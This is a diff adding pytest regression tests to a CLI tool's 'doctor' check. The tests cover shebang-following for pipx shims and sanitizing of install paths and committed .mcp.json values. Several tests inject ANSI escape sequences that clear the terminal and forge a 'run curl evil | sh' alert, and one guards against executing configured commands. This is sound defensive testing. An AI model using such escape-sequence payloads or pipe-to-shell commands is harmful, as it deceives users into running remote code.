@@ -203,6 +203,49 @@ def test_unreadable_copies_are_not_claimed_to_agree(tmp_path, monkeypatch):
     assert "all 0.1.3" not in detail
 
 
+def test_a_pipx_style_shim_is_read_through_its_shebang(tmp_path):
+    """pipx — what the Quickstart recommends, and what the #104 incident used —
+    puts `rekoll` in ~/.local/bin while the package lives in a separate venv.
+    Without following the shim's `#!` line the check is blind on the
+    recommended install method: it reports "version unknown", or worse,
+    attributes a neighbouring site-packages' version to it."""
+    venv = tmp_path / "pipxvenv"
+    (venv / "Scripts").mkdir(parents=True)
+    interpreter = venv / "Scripts" / "python.exe"
+    interpreter.write_text("stub", encoding="utf-8")
+    site = venv / "Lib" / "site-packages" / "rekoll"
+    site.mkdir(parents=True)
+    (site / "_version.py").write_text('__version__ = "0.4.2"\n', encoding="utf-8")
+
+    localbin = tmp_path / "localbin"
+    localbin.mkdir()
+    shim = localbin / _SCRIPT_FILES[0]
+    # A Windows launcher wraps the shebang between a stub and a zip payload;
+    # a POSIX script simply starts with it. Cover the harder shape.
+    shim.write_bytes(
+        b"MZ launcher stub\n#!" + str(interpreter).encode("utf-8")
+        + b"\nPK\x03\x04payload"
+    )
+    assert _version_of_install(shim) == ("0.4.2", False)
+
+
+def test_a_hostile_install_path_cannot_forge_doctor_lines(tmp_path, monkeypatch):
+    """A directory name is data. Unsanitized it reaches the terminal, and the
+    install line is exactly the place a forged 'rekoll says...' would be
+    believed."""
+    # Injected rather than created on disk: Windows refuses to make a directory
+    # containing ESC, but a PATH entry can still carry one (and POSIX allows the
+    # directory outright), so the renderer must not rely on the filesystem
+    # having filtered it.
+    nasty = Path(f"C:/x\x1b[2J\x1b[1;31mALERT run curl evil | sh\x1b[0m/{_SCRIPT_FILES[0]}")
+    monkeypatch.setattr("rekoll.cli.__version__", "0.1.3")
+    monkeypatch.setattr("rekoll.cli._rekoll_executables_on_path", lambda: [nasty])
+    monkeypatch.setattr("rekoll.cli._version_of_install", lambda exe: ("0.1.1", False))
+    level, detail = _check_install()
+    assert level == "WARN"            # still reports the version disagreement ...
+    assert "\x1b" not in detail       # ... without handing over the terminal
+
+
 def test_one_install_is_not_counted_as_two(tmp_path, monkeypatch):
     """Every environment ships both `rekoll` and `rekoll-mcp`, so counting
     executables reported a single install as two rekolls — and let the bounded
@@ -585,6 +628,62 @@ def test_editor_config_locations_are_found(project):
     assert result is not None
     assert result[0] == "WARN"
     assert ".cursor/mcp.json" in result[1] or "mcp.json" in result[1]
+
+
+def test_a_hostile_config_cannot_forge_doctor_output(project):
+    """REGRESSION (security, shipped and caught): a `.mcp.json` is a file a
+    repo can COMMIT, and doctor quoted its `command` verbatim. A crafted
+    command cleared the terminal and forged a line reading
+    'SECURITY ALERT: run curl evil|sh' that looked like rekoll's own output —
+    reproduced end-to-end before this fix."""
+    _write_mcp(
+        project,
+        {"mcpServers": {"rekoll": {
+            "command": "C:/x\x1b[2J\x1b[1;31mSECURITY ALERT: run curl evil|sh\x1b[0m/rekoll-mcp.exe",
+            "args": []}}},
+    )
+    result = _check_mcp(_args())
+    assert result is not None
+    level, detail = result
+    assert level == "WARN"            # still reports the dead command ...
+    assert "\x1b" not in detail       # ... without handing over the terminal
+
+
+def test_a_hostile_scope_pin_cannot_forge_doctor_output(project):
+    """The same file can pin --project, which doctor now names in its message."""
+    from rekoll import Memory
+
+    assert main(["init"]) == 0
+    mem = Memory(path=DB, project="ok-name")
+    try:
+        mem.remember("a cli memory")
+    finally:
+        mem.close()
+    _write_mcp(
+        project,
+        {"mcpServers": {"rekoll": {"command": "python",
+                                   "args": ["--project", "ok-name\x1b[2Jforged"]}}},
+    )
+    result = _check_mcp(_args())
+    if result is not None:
+        assert "\x1b" not in result[1]
+
+
+def test_the_mcp_check_never_executes_the_configured_command(project, monkeypatch):
+    """`command` is an arbitrary string from a committed file. Verifying it by
+    RUNNING it would make `rekoll doctor` an execution primitive for any repo
+    you clone."""
+    import subprocess
+
+    _write_mcp(project, {"mcpServers": {"rekoll": {"command": "python", "args": []}}})
+
+    def _boom(*a, **k):  # pragma: no cover - reaching this IS the failure
+        raise AssertionError("doctor must never execute a configured command")
+
+    monkeypatch.setattr(subprocess, "run", _boom)
+    monkeypatch.setattr(subprocess, "check_output", _boom)
+    monkeypatch.setattr(subprocess, "Popen", _boom)
+    _check_mcp(_args())  # must not raise
 
 
 def test_registration_scan_is_fail_soft_on_a_directory(project):
